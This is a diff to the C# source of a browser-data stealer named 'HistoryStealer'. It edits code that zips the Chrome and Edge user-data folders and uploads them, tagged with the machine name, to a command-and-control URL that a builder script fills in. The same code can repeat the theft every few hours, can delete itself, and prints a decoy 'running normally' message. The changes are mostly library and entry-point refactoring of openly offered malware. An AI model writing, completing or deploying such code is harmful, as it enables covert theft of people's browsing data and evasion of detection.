@@ -2,16 +2,16 @@ using System;
 using System.IO;
 using System.IO.Compression;
 using System.Net.Http;
-using System.Text.Json;
 using System.Threading;
 using System.Threading.Tasks;
+using Newtonsoft.Json; // Replaced System.Text.Json
 
 namespace HistoryStealer
 {
     // Configuration class with hardcoded settings
     public class Config
     {
-        public static readonly string C2Url = "https://example.com/upload";
+        public static readonly string C2Url = "C2_URL_PLACEHOLDER"; // Replaced by builder.py
         public static readonly string ChromePath = Path.Combine(
             Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
             @"Google\Chrome\User Data\Default");
@@ -19,7 +19,6 @@ namespace HistoryStealer
             Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
             @"Microsoft\Edge\User Data\Default");
         public static readonly string TempZipPath = Path.Combine(Path.GetTempPath(), "browser_data.zip");
-        // These will be replaced by builder.py
         public static readonly string Target = "BOTH"; // CHROME, EDGE, or BOTH
         public static readonly int Hours = 0; // 0 for once, N for every N hours
         public static readonly bool SelfDestruct = false; // true to enable self-destruction
@@ -71,7 +70,7 @@ namespace HistoryStealer
                     // Add JSON metadata
                     var jsonData = new { ComputerName = computerName };
                     var jsonContent = new StringContent(
-                        JsonSerializer.Serialize(jsonData),
+                        JsonConvert.SerializeObject(jsonData), // Replaced JsonSerializer
                         System.Text.Encoding.UTF8,
                         "application/json");
                     content.Add(jsonContent, "metadata");
@@ -127,30 +126,28 @@ namespace HistoryStealer
         }
     }
 
-    class Program
+class Program
+{
+    static void Main(string[] args)
     {
-        static async Task Main(string[] args)
-        {
-            do
-            {
-                // Zip and upload
-                BrowserDataZipper.CreateZip();
-                await Uploader.UploadZipAsync(Environment.MachineName);
-
-                // Self-destruct if enabled
-                if (Config.SelfDestruct)
-                {
-                    SelfDestruct.DeleteSelf();
-                    break;
-                }
-
-                // Wait if repeating
-                if (Config.Hours > 0)
-                    await Task.Delay(Config.Hours * 60 * 60 * 1000);
-            } while (Config.Hours > 0);
-
-            // Decoy output
-            Console.WriteLine("Program running normally.");
-        }
+        MainAsync().GetAwaiter().GetResult();
     }
+
+    static async Task MainAsync()
+    {
+        do
+        {
+            BrowserDataZipper.CreateZip();
+            await Uploader.UploadZipAsync(Environment.MachineName);
+            if (Config.SelfDestruct)
+            {
+                SelfDestruct.DeleteSelf();
+                break;
+            }
+            if (Config.Hours > 0)
+                await Task.Delay(Config.Hours * 60 * 60 * 1000);
+        } while (Config.Hours > 0);
+        Console.WriteLine("Program running normally.");
+    }
+}
 }
